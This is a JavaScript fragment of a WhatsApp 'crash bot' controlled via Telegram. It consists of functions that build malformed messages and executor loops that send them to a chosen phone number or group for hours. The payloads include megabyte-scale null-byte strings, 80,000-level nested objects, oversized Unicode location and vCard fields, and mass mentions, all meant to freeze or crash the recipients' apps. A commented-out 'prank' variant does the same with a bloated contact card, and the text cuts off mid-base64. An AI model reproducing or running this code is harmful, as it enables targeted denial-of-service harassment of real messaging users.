  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonAbsoluteDelay(target, userNumber, chatId, botInstance)
          ]);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonCrashFinity(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   /* await userSock.relayMessage(
            target,
            {
                interactiveResponseMessage: {
                    body: {
                        text: `Telegram: @dgxeon13`,
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            },
            {
                participant: { jid: target },
                userJid: target
            }
        );*/
        const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      requestFrom: target, 
      expiryTimestamp: null,
      amount: {
        value: 9999999999, 
        offset: 9999999999, 
        currencyCode: 'INR'
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        fromMe: false,
        remoteJid: "status@broadcast",
        externalAdReply: {
          title: "Telegram: @dgxeon13", 
          body: "Telegram: @dgxeon13", 
          mimetype: 'image',
          caption: "Telegram: @dgxeon13",
          showAdAttribution: true,
          sourceUrl: 'https://t.me/dgxeon13',
          thumbnailUrl: { url: "https://i.ibb.co/ydRKHnw/thumb.jpg" }
        }
      }
    }
  };

  await userSock.relayMessage(target, message, 
    ptcp ? { participant: { jid: target } } : {});
    console.log(chalk.green(`crashfinity sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashfinity for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonGcNull(target, userNumber, chatId, botInstance, ptcp, isAuto = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const options = [
            { optionName: "\u0000" },
            { optionName: "\u0000" },
            { optionName: "\u0000" }
        ];

        const pollMsg = await generateWAMessageFromContent(
            target,
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessage: {
                            name: "\u0000".repeat(1000),
                            options,
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: options[1]
                        }
                    }
                }
            },
            { userJid: target }
        );

        // 🔹 participant REMOVED
        await userSock.relayMessage(
            target,
            pollMsg.message,
            {
                messageId: pollMsg.key.id
            }
        );

        await new Promise(r => setTimeout(r, 3000));

        // 🔹 participant REMOVED here too
        await userSock.relayMessage(
            target,
            {
                ephemeralMessage: {
                    message: Array.from({ length: 80000 }).reduce(
                        () => ({ sendPaymentMessage: {} }),
                        {}
                    )
                }
            },
            {
                messageId: null,
                userJid: target
            }
        );
    
    console.log(chalk.green(`nullgc sent to ${target} ${isAuto ? '(AUTO)' : '(MANUAL)'}`));

    // Register ONLY on manual command (first time)
    if (!isAuto && chatId) {
      if (!gcNullAutoResend.has(userNumber)) {
        gcNullAutoResend.set(userNumber, new Set());
      }
      if (!gcNullAutoResend.get(userNumber).has(target)) {
        gcNullAutoResend.get(userNumber).add(target);
        console.log(`[AUTO GCNULL REGISTERED] Group ${target} for session ${userNumber}`);
      }
    }

  } catch (err) {
    console.error(`nullgc error for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonHideNSeek2(target, userNumber, chatId, botInstance, ptcp = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(5000),
            url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        };

        const msg = generateWAMessageFromContent(
            target,
            { viewOnceMessage: { message: { locationMessage } } },
            {}
        );

        await userSock.relayMessage(
            target,
            { groupStatusMessageV2: { message: msg.message } },
            ptcp
                ? { messageId: msg.key.id, participant: { jid: target } }
                : { messageId: msg.key.id }
        );
  } catch (err) {
  console.error(`Error in hidenseek2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in hidenseek2: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonNullfinity(target, userNumber, chatId, botInstance, ptcp, isAuto = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const options = [
            { optionName: "\u0000" },
            { optionName: "\u0000" },
            { optionName: "\u0000" }
        ];

        const pollMsg = await generateWAMessageFromContent(
            target,
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessage: {
                            name: "\u0000".repeat(1000),
                            options,
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: options[1]
                        }
                    }
                }
            },
            { userJid: target }
        );

        await userSock.relayMessage(
            target,
            pollMsg.message,
            {
                participant: { jid: target },
                messageId: pollMsg.key.id
            }
        );

        await new Promise(r => setTimeout(r, 3000));

        await userSock.relayMessage(
            target,
            {
                ephemeralMessage: {
                    message: Array.from({ length: 80000 }).reduce(
                        () => ({ sendPaymentMessage: {} }),
                        {}
                    )
                }
            },
            {
                messageId: null,
                participant: { jid: target },
                userJid: target
            }
        );
    
    console.log(chalk.green(`Nullfinity sent to ${target} ${isAuto ? '(AUTO)' : '(MANUAL)'}`));

    // === ONLY on manual command: register + ignore next 5 outgoing (covers your for-loop of 3) ===
    if (!isAuto && chatId) {
      if (!nullfinityAutoResend.has(userNumber)) {
        nullfinityAutoResend.set(userNumber, new Set());
      }
      if (!nullfinityAutoResend.get(userNumber).has(target)) {
        nullfinityAutoResend.get(userNumber).add(target);
        console.log(`[AUTO NULLFINITY REGISTERED] ${target} for session ${userNumber}`);
      }

      // Ignore the next 5 outgoing messages to this target (safety for your 3-send loop)
      if (!ignoreOutgoingDuringCommand.has(userNumber)) {
        ignoreOutgoingDuringCommand.set(userNumber, new Set());
      }
      ignoreOutgoingDuringCommand.get(userNumber).add(target);
      // Optional: auto-remove ignore after 10 seconds (cleanup)
      setTimeout(() => {
        const set = ignoreOutgoingDuringCommand.get(userNumber);
        if (set) {
          set.delete(target);
          if (set.size === 0) ignoreOutgoingDuringCommand.delete(userNumber);
        }
      }, 10000);
    }

  } catch (err) {
    console.error(`Nullfinity error for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonHideNSeek(target, userNumber, chatId, botInstance, ptcp = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const extendedTextMessage = {
        text: "Telegram: @dgxeon13 \n\n Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://t.me/dgxeon13",
        description: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
        }
    };

    const msg = generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: { extendedTextMessage } } },
        {}
    );

    await userSock.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, ptcp ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  } catch (err) {
  console.error(`Error in hidenseek for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in hidenseek: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonHideNSeekExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000;    // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`Starting batch ${batch}...`));

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }

        let count = 0;
        const maxLoops = 25; // Total 25 calls

        while (count < maxLoops) {
          if (count % 2 === 0) {
            // Even index (0,2,4...): bulldozer
            await xeonHideNSeek(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ hidenseek1... (${count + 1}/25)\n └────────────────────────┘ `));
          } else {
            // Odd index (1,3,5...): ultrayDelay
            await xeonHideNSeek2(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ hidenseek2... (${count + 1}/25)\n └────────────────────────┘ `));
          }
          count++;
        }

        // After 25 alternating calls
        console.log(chalk.bgYellow.black("25 calls done: xeonHideNSeek → xeonHideNSeek2 → ... (13 + 12), sleep 10s..."));
        await new Promise(resolve => setTimeout(resolve, 10000));

      } catch (error) {
        console.error(`Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `Error in hidenseek: ${error.message}. Process stopped.`);
        return;
      }
    }

    console.log(chalk.green(`Finished batch ${batch}`));
    batch++;

    if (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }

  console.log(chalk.cyan(`Done! Total batches sent: ${batch - 1}`));
}

async function xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "Telegram @dgxeon13",
            matchedText: "https://t.me/dgxeon13",
            description: "Telegram @dgxeon13",
            title: "Telegram @dgxeon13",
            paymentLinkMetadata: {
                button: { displayText: "Telegram @dgxeon13" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "Telegram @dgxeon13" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {});

    for(let i = 0; i < 100; i++) {
        await userSock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null 
        });
        
        if (i < 99) await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    console.log(chalk.green(`Invisible sent to ${target}`));
  } catch (err) {
  console.error(`Error in invisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonAndroidInvisibleKingExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance, ptcp)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayXceedExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayXceed(target, userNumber, chatId, botInstance, ptcp)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayXceed(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   let msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "Telegram: @dgxeon13",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await userSock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, ptcp ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
    
    console.log(chalk.green(`Delayxceed sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delayxceed for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

/*async function prankGreet2(target, userNumber, chatId, botInstance) {
  const prankKey = `${userNumber}:${target}`;
  const type = 'ioscunt';  // Fixed type for this function

  // ────────────────────────────────────────────────
  // VERY EARLY + LOCKED CHECK
  // ────────────────────────────────────────────────
  if (activePrankGreets.has(prankKey)) {
    console.log(`[DEBUG] Duplicate blocked (already active): ${prankKey}`);
    await botInstance.sendMessage(chatId, 
      `⚠️ ioscunt is *already running* for ${target.replace(/@s.whatsapp.net$/, '')}.\n` +
      `Use /stopioscunt ${target.replace(/@s.whatsapp.net$/, '')} to stop it first.`,
      { parse_mode: 'Markdown' }
    );
    return;
  }

  // Acquire init lock
  if (prankInitLocks.has(prankKey)) {
    console.log(`[DEBUG] Waiting for init lock: ${prankKey}`);
    await prankInitLocks.get(prankKey);
    if (activePrankGreets.has(prankKey)) {
      console.log(`[DEBUG] Became duplicate during lock wait: ${prankKey}`);
      await botInstance.sendMessage(chatId, 
        `⚠️ ioscunt is *already running* for ${target.replace(/@s.whatsapp.net$/, '')}.\n` +
        `Use /stopioscunt ${target.replace(/@s.whatsapp.net$/, '')} to stop it first.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  let releaseInitLock;
  const initLockPromise = new Promise(resolve => { releaseInitLock = resolve; });
  prankInitLocks.set(prankKey, initLockPromise);

  try {
    console.log(`[DEBUG] Acquired lock & starting: ${prankKey}`);

    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    let userSock = sessions.get(userNumber);
    if (!userSock) throw new Error('Socket not found');

    const startTime = Date.now();
    const maxDuration = 60 * 60 * 1000;

    let dashboard = userPrankDashboards.get(chatId);
    if (!dashboard) {
      dashboard = {
        messageId: null,
        chatId,
        lastEditTime: 0,
        pranks: new Map()
      };
      userPrankDashboards.set(chatId, dashboard);
    }

    const isFirstPrank = dashboard.pranks.size === 0;
    dashboard.pranks.set(target, { count: 0, type });

    if (dashboard.messageId && !isFirstPrank) {
      try {
        await botInstance.deleteMessage(chatId, dashboard.messageId);
        dashboard.messageId = null;
      } catch {}
    }

    await updateDashboard(botInstance, dashboard, 'live');

    const thisControl = {
      stopFlag: false,
      dashboardKey: chatId,
      startTime,
      instanceId: Date.now() + Math.random(),
      type  // Add type to control
    };

    activePrankGreets.set(prankKey, thisControl);

    await new Promise(r => setTimeout(r, 3000));
    dashboard.lastEditTime = Date.now();

    let count = 0;
    while (Date.now() - startTime < maxDuration) {
      const current = activePrankGreets.get(prankKey);
      if (!current || current !== thisControl || current.stopFlag) {
        console.log(`[DEBUG] Loop exited - !current=${!current}, replaced=${current !== thisControl}, flagged=${current?.stopFlag}`);
        break;
      }

      // AUTO-STOP CHECK (no notification here anymore)
      if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
        console.log(`[PRANK AUTO-STOP] Session deleted/disconnected → ${prankKey}`);
        break;
      }

      try {
        let msg = generateWAMessageFromContent(
        target,
        {
          contactMessage: {
            displayName:
              "🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
              "𑇂𑆵𑆴𑆿".repeat(10000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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